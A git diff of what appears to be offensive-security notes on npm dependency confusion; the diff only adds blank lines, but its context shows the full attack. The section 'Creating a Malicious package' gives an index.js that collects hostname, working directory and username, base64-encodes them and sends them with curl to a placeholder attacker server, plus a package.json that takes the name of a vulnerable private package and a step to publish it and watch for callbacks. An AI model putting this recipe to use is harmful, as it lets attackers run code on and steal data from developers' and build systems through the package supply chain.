@@ -3,6 +3,7 @@
 **Info**
 - In Node, npm packages are stated in the package.json file
 - Will look something like this:
+
 ```
 "devDependencies" : {
     "my_test_framework": "^3.1.0",
@@ -24,6 +25,7 @@
   - This could look like `org-name/package` (without the `@`)
 - Node will then use the public package over the private one, allowing code execution
 - [Synyc](https://github.com/snyk-labs/snync) is a good tool to scan for and recognize these packages:
+
 ```
 # !/bin/bash
 # Set the base directory to the current working directory
@@ -44,6 +46,7 @@ done
 
 **Creating a Malicious package**
 - Create `index.js`:
+
 ```
 const { exec } = require("child_process");
 exec("a=$(hostname;pwd;whoami;) && b=$(echo $a | base64) && curl -X POST {attacker-server} -d $b" , (error, data, getter) => {
@@ -59,6 +62,7 @@ exec("a=$(hostname;pwd;whoami;) && b=$(echo $a | base64) && curl -X POST {attack
 });
 ```
 - Create `package.json`:
+
 ```
 {
     "name":"{vulnerable_package_name}",
@@ -73,4 +77,5 @@ exec("a=$(hostname;pwd;whoami;) && b=$(echo $a | base64) && curl -X POST {attack
     "license":"MIT"
 }
 ```
+
 - Then just run `npm public --access=public` and monitor attacker server
